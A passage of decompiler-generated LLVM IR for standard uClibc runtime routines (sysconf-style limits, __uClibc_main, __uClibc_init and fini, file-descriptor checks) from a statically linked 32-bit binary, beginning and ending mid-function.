    i32 105, label %dec_label_pc_804b6bf
    i32 106, label %dec_label_pc_804b71b
    i32 107, label %dec_label_pc_804b71b
    i32 108, label %dec_label_pc_804b6ff
    i32 109, label %dec_label_pc_804b73c
    i32 110, label %dec_label_pc_804b758
    i32 111, label %dec_label_pc_804b6f8
    i32 112, label %dec_label_pc_804b735
    i32 113, label %dec_label_pc_804b758
    i32 114, label %dec_label_pc_804b6c9
    i32 115, label %dec_label_pc_804b751
    i32 116, label %dec_label_pc_804b730
    i32 117, label %dec_label_pc_804b730
    i32 118, label %dec_label_pc_804b6d3
    i32 119, label %dec_label_pc_804b6dd
    i32 120, label %dec_label_pc_804b74a
    i32 121, label %dec_label_pc_804b70d
    i32 122, label %dec_label_pc_804b70d
    i32 123, label %dec_label_pc_804b70d
    i32 124, label %dec_label_pc_804b70d
    i32 125, label %dec_label_pc_804b631
    i32 126, label %dec_label_pc_804b631
    i32 127, label %dec_label_pc_804b730
    i32 128, label %dec_label_pc_804b730
    i32 129, label %dec_label_pc_804b631
    i32 130, label %dec_label_pc_804b631
    i32 131, label %dec_label_pc_804b730
    i32 149, label %dec_label_pc_804b6e4
  ]

dec_label_pc_804b631:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b63b:                             ; preds = %entry
  %v1_804b63b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804b640 = inttoptr i32 %v1_804b63b to i32*
  store i32 22, i32* %v1_804b640, align 4
  br label %dec_label_pc_804b730

dec_label_pc_804b64b:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b655:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b65f:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b669:                             ; preds = %entry
  %v0_804b66c = call i32 @getdtablesize()
  br label %dec_label_pc_804b671

dec_label_pc_804b671:                             ; preds = %entry, %dec_label_pc_804b669
  br label %dec_label_pc_804b75d

dec_label_pc_804b67b:                             ; preds = %entry
  %v0_804b67e = call i32 @__GI_getpagesize()
  br label %dec_label_pc_804b683

dec_label_pc_804b683:                             ; preds = %entry, %dec_label_pc_804b67b
  br label %dec_label_pc_804b75d

dec_label_pc_804b68d:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b697:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6a1:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6ab:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6b5:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6bf:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6c9:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6d3:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6dd:                             ; preds = %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6e4:                             ; preds = %entry
  %v5_804b6ea = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804b6f2 = icmp slt i32 %v5_804b6ea, 0
  %v1_804b6f4 = icmp eq i1 %v2_804b6f2, false
  br i1 %v1_804b6f4, label %dec_label_pc_804b706, label %dec_label_pc_804b730

dec_label_pc_804b6f8:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b6ff:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b706:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b6e4
  br label %dec_label_pc_804b75d

dec_label_pc_804b70d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b714:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b71b:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b722:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b729:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b730:                             ; preds = %dec_label_pc_804b6e4, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b63b
  br label %dec_label_pc_804b75d

dec_label_pc_804b735:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b73c:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b743:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b74a:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b751:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b758:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804b75d

dec_label_pc_804b75d:                             ; preds = %dec_label_pc_804b751, %dec_label_pc_804b74a, %dec_label_pc_804b743, %dec_label_pc_804b73c, %dec_label_pc_804b735, %dec_label_pc_804b729, %dec_label_pc_804b722, %dec_label_pc_804b71b, %dec_label_pc_804b714, %dec_label_pc_804b70d, %dec_label_pc_804b6ff, %dec_label_pc_804b6f8, %dec_label_pc_804b706, %dec_label_pc_804b6dd, %dec_label_pc_804b6d3, %dec_label_pc_804b6c9, %dec_label_pc_804b6bf, %dec_label_pc_804b6b5, %dec_label_pc_804b6ab, %dec_label_pc_804b6a1, %dec_label_pc_804b697, %dec_label_pc_804b68d, %dec_label_pc_804b683, %dec_label_pc_804b671, %dec_label_pc_804b65f, %dec_label_pc_804b655, %dec_label_pc_804b64b, %dec_label_pc_804b631, %dec_label_pc_804b730, %dec_label_pc_804b758
  %v0_804b760 = phi i32 [ 255, %dec_label_pc_804b751 ], [ 2048, %dec_label_pc_804b74a ], [ 99, %dec_label_pc_804b743 ], [ 20, %dec_label_pc_804b73c ], [ -128, %dec_label_pc_804b735 ], [ 1024, %dec_label_pc_804b729 ], [ 4, %dec_label_pc_804b722 ], [ 32, %dec_label_pc_804b71b ], [ 256, %dec_label_pc_804b714 ], [ 2147483647, %dec_label_pc_804b70d ], [ 16, %dec_label_pc_804b6ff ], [ 127, %dec_label_pc_804b6f8 ], [ 200112, %dec_label_pc_804b706 ], [ 9, %dec_label_pc_804b6dd ], [ 65535, %dec_label_pc_804b6d3 ], [ -32768, %dec_label_pc_804b6c9 ], [ -2147483648, %dec_label_pc_804b6bf ], [ 8, %dec_label_pc_804b6b5 ], [ 500, %dec_label_pc_804b6ab ], [ 4096, %dec_label_pc_804b6a1 ], [ 16384, %dec_label_pc_804b697 ], [ 1000, %dec_label_pc_804b68d ], [ 32768, %dec_label_pc_804b683 ], [ 6, %dec_label_pc_804b671 ], [ 65536, %dec_label_pc_804b65f ], [ 100, %dec_label_pc_804b655 ], [ 131072, %dec_label_pc_804b64b ], [ 1, %dec_label_pc_804b631 ], [ -1, %dec_label_pc_804b730 ], [ 32767, %dec_label_pc_804b758 ]
  ret i32 %v0_804b760

; uselistorder directives
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 30, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804b75d, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804b730, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804b706, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b683, { 1, 0 }
  uselistorder label %dec_label_pc_804b671, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b764 = load i32, i32* @ebx, align 4
  store i32 %v0_804b764, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b778, label %dec_label_pc_804b785

dec_label_pc_804b778:                             ; preds = %entry, %dec_label_pc_804b778
  %v1_804b77f6 = phi i32 [ %v1_804b77f, %dec_label_pc_804b778 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804b77f.70 to i32), i32* %stack_var_-16, align 4
  %v5_804b778 = mul i32 %v1_804b77f6, 4
  %v6_804b778 = add i32 %v5_804b778, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b778 = inttoptr i32 %v6_804b778 to i32*
  %v8_804b778 = load i32, i32* %v7_804b778, align 4
  call void @__pseudo_call(i32 %v8_804b778)
  %v0_804b77f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b77f = add i32 %v0_804b77f.pre, -1
  store i32 %v1_804b77f, i32* %ebx.global-to-local, align 4
  %v10_804b780 = icmp eq i32 %v0_804b77f.pre, 0
  %v1_804b783 = icmp eq i1 %v10_804b780, false
  br i1 %v1_804b783, label %dec_label_pc_804b778, label %dec_label_pc_804b785

dec_label_pc_804b785:                             ; preds = %dec_label_pc_804b778, %entry
  %v0_804b785 = load i32, i32* @global_var_8052514.71, align 4
  %v1_804b78a = icmp eq i32 %v0_804b785, 0
  br i1 %v1_804b78a, label %dec_label_pc_804b790, label %dec_label_pc_804b78e

dec_label_pc_804b78e:                             ; preds = %dec_label_pc_804b785
  %v0_804b78e = load i32, i32* %stack_var_-16, align 4
  %v1_804b78e = call i32 @unknown_0(i32 %v0_804b78e)
  br label %dec_label_pc_804b790

dec_label_pc_804b790:                             ; preds = %dec_label_pc_804b78e, %dec_label_pc_804b785
  %v0_804b790 = load i32, i32* @global_var_8052518.72, align 8
  %v1_804b796 = icmp eq i32 %v0_804b790, 0
  br i1 %v1_804b796, label %dec_label_pc_804b79f, label %dec_label_pc_804b79a

dec_label_pc_804b79a:                             ; preds = %dec_label_pc_804b790
  %v2_804b79c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b79c, i32* %ebx.global-to-local, align 4
  %v0_804b79d = load i32, i32* %stack_var_-16, align 4
  %v1_804b79d = call i32 @unknown_0(i32 %v0_804b79d)
  br label %dec_label_pc_804b79f

dec_label_pc_804b79f:                             ; preds = %dec_label_pc_804b790, %dec_label_pc_804b79a
  %v2_804b79f = load i32, i32* %stack_var_-16, align 4
  ret i32 %v2_804b79f

; uselistorder directives
  uselistorder i32 %v1_804b77f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b79f, { 1, 0 }
  uselistorder label %dec_label_pc_804b778, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b7a6 = load i32, i32* @eax, align 4
  ret i32 %v0_804b7a6
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804b7a7 = load i32, i32* @esi, align 4
  %v0_804b7a8 = load i32, i32* @eax, align 4
  store i32 %v0_804b7a8, i32* @esi, align 4
  %v0_804b7aa = load i32, i32* @ebx, align 4
  store i32 %v0_804b7aa, i32* %stack_var_-8, align 4
  %v0_804b7ab = load i32, i32* @edx, align 4
  store i32 %v0_804b7ab, i32* @ebx, align 4
  %v4_804b7b3 = call i32 @__libc_fcntl(i32 %v0_804b7a8, i32 1, i32 %tmp6)
  %v1_804b7bb = add i32 %v4_804b7b3, 1
  %v8_804b7bb = icmp eq i32 %v1_804b7bb, 0
  %v1_804b7bc = icmp eq i1 %v8_804b7bb, false
  br i1 %v1_804b7bc, label %dec_label_pc_804b7d7, label %dec_label_pc_804b7be

dec_label_pc_804b7be:                             ; preds = %entry
  %v0_804b7c0 = load i32, i32* @ebx, align 4
  %v5_804b7c6 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050800.73, i32 0, i32 0), i32 %v0_804b7c0, i32 %v1_804b7bb)
  %v1_804b7ce = load i32, i32* @esi, align 4
  %v12_804b7ce = icmp eq i32 %v5_804b7c6, %v1_804b7ce
  br i1 %v12_804b7ce, label %dec_label_pc_804b7d7, label %dec_label_pc_804b7d2

dec_label_pc_804b7d2:                             ; preds = %dec_label_pc_804b7be
  %v0_804b7d2 = call i32 @abort()
  br label %dec_label_pc_804b7d7

dec_label_pc_804b7d7:                             ; preds = %dec_label_pc_804b7be, %entry, %dec_label_pc_804b7d2
  %v2_804b7d7 = load i32, i32* %stack_var_-12, align 4
  %v2_804b7d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b7d8, i32* @ebx, align 4
  store i32 %v0_804b7a7, i32* @esi, align 4
  ret i32 %v2_804b7d7

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b7d7, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804b7de = load i8, i8* @global_var_805251c.74, align 4
  %v1_804b7de = icmp eq i8 %v0_804b7de, 0
  %v1_804b7e5 = icmp eq i1 %v1_804b7de, false
  br i1 %v1_804b7e5, label %entry.dec_label_pc_804b817_crit_edge, label %dec_label_pc_804b7e7

entry.dec_label_pc_804b817_crit_edge:             ; preds = %entry
  %v0_804b81a.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804b817

dec_label_pc_804b7e7:                             ; preds = %entry
  store i8 1, i8* @global_var_805251c.74, align 4
  store i32 4096, i32* @global_var_8052510.75, align 16
  %v0_804b812 = call i32 @_stdio_init()
  br label %dec_label_pc_804b817

dec_label_pc_804b817:                             ; preds = %entry.dec_label_pc_804b817_crit_edge, %dec_label_pc_804b7e7
  %v0_804b81a = phi i32 [ %v0_804b81a.pre, %entry.dec_label_pc_804b817_crit_edge ], [ %v0_804b812, %dec_label_pc_804b7e7 ]
  ret i32 %v0_804b81a

; uselistorder directives
  uselistorder i8* @global_var_805251c.74, { 1, 0 }
  uselistorder label %dec_label_pc_804b817, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_804b81b = load i32, i32* @ebp, align 4
  store i32 %tmp30, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8052508.76, align 8
  store i32 %arg6, i32* @global_var_8052518.72, align 8
  %v2_804b852 = mul i32 %arg2, 4
  %v3_804b852 = add i32 %tmp30, %v2_804b852
  %v1_804b855 = add i32 %v3_804b852, 4
  store i32 %v1_804b855, i32* @global_var_805250c.77, align 4
  %v3_804b85e = load i32, i32* %arg3, align 4
  %v14_804b85e = icmp eq i32 %v1_804b855, %v3_804b85e
  store i32 0, i32* %stack_var_-168, align 4
  %v1_804b864 = icmp eq i1 %v14_804b85e, false
  %v4_804b864 = select i1 %v1_804b864, i32 %v1_804b855, i32 %v3_804b852
  store i32 %v4_804b864, i32* @global_var_805250c.77, align 4
  %v2_804b86c = ptrtoint i32* %stack_var_-136 to i32
  %v3_804b871 = bitcast i32* %stack_var_-136 to i8*
  %v4_804b871 = call i32 @__GI_memset(i8* %v3_804b871, i32 0, i32 120)
  %v0_804b876 = load i32, i32* @global_var_805250c.77, align 4
  br label %dec_label_pc_804b87e

dec_label_pc_804b87e:                             ; preds = %dec_label_pc_804b87e, %entry
  %v0_804b87e = phi i32 [ %v1_804b881, %dec_label_pc_804b87e ], [ %v0_804b876, %entry ]
  %v1_804b87e = inttoptr i32 %v0_804b87e to i32*
  %v2_804b87e = load i32, i32* %v1_804b87e, align 4
  %v3_804b87e = icmp eq i32 %v2_804b87e, 0
  %v1_804b881 = add i32 %v0_804b87e, 4
  %v1_804b884 = icmp eq i1 %v3_804b87e, false
  br i1 %v1_804b884, label %dec_label_pc_804b87e, label %dec_label_pc_804b8a5.preheader

dec_label_pc_804b8a5.preheader:                   ; preds = %dec_label_pc_804b87e
  store i32 %v1_804b881, i32* @ebx, align 4
  %v1_804b8a51 = inttoptr i32 %v1_804b881 to i32*
  %v2_804b8a52 = load i32, i32* %v1_804b8a51, align 4
  %v3_804b8a53 = icmp eq i32 %v2_804b8a52, 0
  %v1_804b8a810 = icmp eq i1 %v3_804b8a53, false
  br i1 %v1_804b8a810, label %dec_label_pc_804b88a.lr.ph, label %dec_label_pc_804b8aa

dec_label_pc_804b88a.lr.ph:                       ; preds = %dec_label_pc_804b8a5.preheader
  %v3_804b862 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804b895 = add i32 %v3_804b862, 32
  br label %dec_label_pc_804b88a

dec_label_pc_804b88a:                             ; preds = %dec_label_pc_804b88a.lr.ph, %dec_label_pc_804b8a2
  %v1_804b895 = phi i32 [ %v2_804b8a52, %dec_label_pc_804b88a.lr.ph ], [ %v2_804b8a5, %dec_label_pc_804b8a2 ]
  %v0_804b894 = phi i32 [ %v1_804b881, %dec_label_pc_804b88a.lr.ph ], [ %v1_804b8a2, %dec_label_pc_804b8a2 ]
  %v6_804b88f = icmp ugt i32 %v1_804b895, 14
  br i1 %v6_804b88f, label %dec_label_pc_804b8a2, label %dec_label_pc_804b891

dec_label_pc_804b891:                             ; preds = %dec_label_pc_804b88a
  store i32 %v0_804b894, i32* %stack_var_-168, align 4
  %v2_804b895 = mul i32 %v1_804b895, 8
  %v4_804b895 = add i32 %v3_804b895, %v2_804b895
  %v3_804b89a = inttoptr i32 %v4_804b895 to i16*
  %v4_804b89a = call i32 @memcpy(i16* %v3_804b89a, i32 %v0_804b894, i32 8)
  %v0_804b8a2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b8a2

dec_label_pc_804b8a2:                             ; preds = %dec_label_pc_804b88a, %dec_label_pc_804b891
  %v0_804b8a2 = phi i32 [ %v0_804b894, %dec_label_pc_804b88a ], [ %v0_804b8a2.pre, %dec_label_pc_804b891 ]
  %v1_804b8a2 = add i32 %v0_804b8a2, 8
  store i32 %v1_804b8a2, i32* @ebx, align 4
  %v1_804b8a5 = inttoptr i32 %v1_804b8a2 to i32*
  %v2_804b8a5 = load i32, i32* %v1_804b8a5, align 4
  %v3_804b8a5 = icmp eq i32 %v2_804b8a5, 0
  %v1_804b8a8 = icmp eq i1 %v3_804b8a5, false
  br i1 %v1_804b8a8, label %dec_label_pc_804b88a, label %dec_label_pc_804b8aa

dec_label_pc_804b8aa:                             ; preds = %dec_label_pc_804b8a2, %dec_label_pc_804b8a5.preheader
  store i32 %v2_804b86c, i32* @eax, align 4
  %v0_804b8ae = call i32 @_dl_aux_init()
  store i32 %v0_804b8ae, i32* @eax, align 4
  %v0_804b8b3 = call i32 @__GI___uClibc_init()
  %v1_804b8c1 = icmp eq i32 %tmp25, 0
  %v3_804b8c3 = select i1 %v1_804b8c1, i32 4096, i32 %tmp25
  %v13_804b8c6 = icmp eq i32 %tmp24, -1
  store i32 %v3_804b8c3, i32* @global_var_8052510.75, align 16
  %v1_804b8d0 = icmp eq i1 %v13_804b8c6, false
  br i1 %v1_804b8d0, label %dec_label_pc_804b8fb, label %dec_label_pc_804b8d2

dec_label_pc_804b8d2:                             ; preds = %dec_label_pc_804b8aa
  %v0_804b8d2 = call i32 @getuid()
  store i32 %v0_804b8d2, i32* @ebx, align 4
  %v0_804b8d9 = call i32 @geteuid()
  %v0_804b8de = load i32, i32* @ebx, align 4
  %v12_804b8de = icmp eq i32 %v0_804b8de, %v0_804b8d9
  %v1_804b8e0 = icmp eq i1 %v12_804b8de, false
  br i1 %v1_804b8e0, label %dec_label_pc_804b911, label %dec_label_pc_804b8e2

dec_label_pc_804b8e2:                             ; preds = %dec_label_pc_804b8d2
  %v0_804b8e2 = call i32 @getgid()
  store i32 %v0_804b8e2, i32* @ebx, align 4
  %v0_804b8e9 = call i32 @getegid()
  %v0_804b8ee = load i32, i32* @ebx, align 4
  %v12_804b8ee = icmp eq i32 %v0_804b8ee, %v0_804b8e9
  %v1_804b8f0 = icmp eq i1 %v12_804b8ee, false
  br i1 %v1_804b8f0, label %dec_label_pc_804b911, label %dec_label_pc_804b8f2.thread

dec_label_pc_804b8f2.thread:                      ; preds = %dec_label_pc_804b8e2
  br label %dec_label_pc_804b93b

dec_label_pc_804b8fb:                             ; preds = %dec_label_pc_804b8aa
  %v15_804b8fb = icmp eq i32 %tmp24, %tmp23
  %v1_804b8ff = icmp eq i1 %v15_804b8fb, false
  br i1 %v1_804b8ff, label %dec_label_pc_804b911, label %dec_label_pc_804b901

dec_label_pc_804b901:                             ; preds = %dec_label_pc_804b8fb
  br label %dec_label_pc_804b911

dec_label_pc_804b911:                             ; preds = %dec_label_pc_804b901, %dec_label_pc_804b8e2, %dec_label_pc_804b8d2, %dec_label_pc_804b8fb
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804b918 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804b927 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804b936 = call i32 @__check_one_fd()
  br label %dec_label_pc_804b93b

dec_label_pc_804b93b:                             ; preds = %dec_label_pc_804b8f2.thread, %dec_label_pc_804b911
  %v0_804b93b = load i32, i32* @edi, align 4
  %v1_804b93b = inttoptr i32 %v0_804b93b to i32*
  %v2_804b93b = load i32, i32* %v1_804b93b, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_804b93b, i32* bitcast (i32** @global_var_8052158.79 to i32*), align 8
  store i32 %arg5, i32* @global_var_8052514.71, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b960, label %dec_label_pc_804b96c

dec_label_pc_804b960:                             ; preds = %dec_label_pc_804b93b, %dec_label_pc_804b960
  %v4_804b96045 = phi i32 [ %v1_804b967, %dec_label_pc_804b960 ], [ 0, %dec_label_pc_804b93b ]
  %v5_804b960 = mul i32 %v4_804b96045, 4
  %v6_804b960 = add i32 %v5_804b960, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b960 = inttoptr i32 %v6_804b960 to i32*
  %v8_804b960 = load i32, i32* %v7_804b960, align 4
  call void @__pseudo_call(i32 %v8_804b960)
  %v0_804b967 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b967 = add i32 %v0_804b967, 1
  store i32 %v1_804b967, i32* %ebx.global-to-local, align 4
  %v1_804b968.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b968 = icmp ult i32 %v1_804b967, %v1_804b968.pre
  br i1 %v7_804b968, label %dec_label_pc_804b960, label %dec_label_pc_804b96c

dec_label_pc_804b96c:                             ; preds = %dec_label_pc_804b960, %dec_label_pc_804b93b
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b984, label %dec_label_pc_804b990

dec_label_pc_804b984:                             ; preds = %dec_label_pc_804b96c, %dec_label_pc_804b984
  %v4_804b98444 = phi i32 [ %v1_804b98b, %dec_label_pc_804b984 ], [ 0, %dec_label_pc_804b96c ]
  store i32 ptrtoint (i32* @global_var_804b98b.81 to i32), i32* %stack_var_-168, align 4
  %v5_804b984 = mul i32 %v4_804b98444, 4
  %v6_804b984 = add i32 %v5_804b984, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b984 = inttoptr i32 %v6_804b984 to i32*
  %v8_804b984 = load i32, i32* %v7_804b984, align 4
  call void @__pseudo_call(i32 %v8_804b984)
  %v0_804b98b = load i32, i32* @ebx, align 4
  %v1_804b98b = add i32 %v0_804b98b, 1
  store i32 %v1_804b98b, i32* @ebx, align 4
  %v1_804b98c.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b98c = icmp ult i32 %v1_804b98b, %v1_804b98c.pre
  br i1 %v7_804b98c, label %dec_label_pc_804b984, label %dec_label_pc_804b990

dec_label_pc_804b990:                             ; preds = %dec_label_pc_804b984, %dec_label_pc_804b96c
  %v0_804b999 = load i32, i32* %stack_var_-168, align 4
  %v1_804b999 = call i32 @__errno_location(i32 %v0_804b999)
  %v1_804b99e = inttoptr i32 %v1_804b999 to i32*
  store i32 0, i32* %v1_804b99e, align 4
  %v0_804b9ad = call i32 @__GI___h_errno_location()
  store i32 %v0_804b9ad, i32* @eax, align 4
  %v1_804b9b2 = inttoptr i32 %v0_804b9ad to i32*
  store i32 0, i32* %v1_804b9b2, align 4
  %v0_804b9b9 = load i32, i32* @global_var_805250c.77, align 4
  store i32 %v0_804b9b9, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_804b81b)
  %v0_804b9ce = load i32, i32* @eax, align 4
  %v1_804b9d1 = call i32 @__GI_exit(i32 %v0_804b9ce)
  %v0_804b9dd = load i32, i32* @ebx, align 4
  %v1_804b9dd = inttoptr i32 %v0_804b9dd to %sigcontext*
  %v2_804b9dd = call i32 @sigreturn(%sigcontext* %v1_804b9dd)
  %v0_804b9e5 = load i32, i32* @ebx, align 4
  %v1_804b9e5 = inttoptr i32 %v0_804b9e5 to %sigcontext*
  %v2_804b9e5 = call i32 @sigreturn(%sigcontext* %v1_804b9e5)
  ret i32 %v2_804b9e5

; uselistorder directives
  uselistorder i32 %v1_804b98b, { 1, 2, 0 }
  uselistorder i32 %v1_804b967, { 1, 2, 0 }
  uselistorder i32 %v2_804b8a5, { 1, 0 }
  uselistorder i32 %v1_804b8a2, { 2, 1, 0 }
  uselistorder i32 %v1_804b881, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804b87e, { 1, 0 }
  uselistorder i32 %v1_804b855, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b984, { 1, 0 }
  uselistorder label %dec_label_pc_804b960, { 1, 0 }
  uselistorder label %dec_label_pc_804b93b, { 1, 0 }
  uselistorder label %dec_label_pc_804b911, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804b8a2, { 1, 0 }
  uselistorder label %dec_label_pc_804b88a, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804b9e7 = load i32, i32* @esi, align 4
  %v0_804b9e8 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804b9fd = icmp eq i32* %arg2, null
